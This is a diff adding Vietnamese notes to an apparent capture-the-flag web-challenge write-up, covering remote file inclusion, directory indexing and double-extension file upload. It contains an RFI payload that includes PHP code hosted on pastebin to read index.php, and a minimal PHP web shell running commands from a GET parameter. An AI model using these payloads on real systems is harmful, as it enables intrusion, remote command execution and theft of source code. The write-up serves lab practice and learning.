@@ -93,9 +93,47 @@ name too long
    show_source('flag-mipkBswUppqwXlq9ZydO.php'); 
 ?>
 ```
+## Remote File Inclusion
 
 
 
+ĐIỀU QUAN TRỌNG VỚI DẠNG BÀI REMOTE FILE INCLUSION NÀY , TA PHẢI INCLUDE 1 FILE TỪ WEB SERVER KHÁC !
+
+
+Dùng 1 server khác để get tham số là câu lệnh <?php echo file_get_contents ('index.php')?>
+
+Mình sẽ đề xuất sử dụng https://pastebin.com/ vì nó khá là tiện 
+
+
+?lang=https://pastebin.com/raw/LjpyDxwq?
+
+
+
+## HTTP - Directory indexing
+
+![image](https://user-images.githubusercontent.com/77602549/164369902-07dcd33e-d61f-4803-ab1a-8bb4d676ee70.png)
+
+
+
+![image](https://user-images.githubusercontent.com/77602549/164369994-0717f0f4-9d35-4d32-896d-e20f1ec686ec.png)
+
+
+
+![image](https://user-images.githubusercontent.com/77602549/164369921-1623f8fd-d2b4-4ad5-aed4-0ef04884f0c9.png)
+
+
+
+## File upload - Double extensions
+
+![image](https://user-images.githubusercontent.com/77602549/164371548-8de896ab-5b5a-417e-88b2-161fa7313293.png)
+
+
+<?php
+
+$data = system($_GET["cmd"]);
+echo $data;
+
+?>
 
 
 
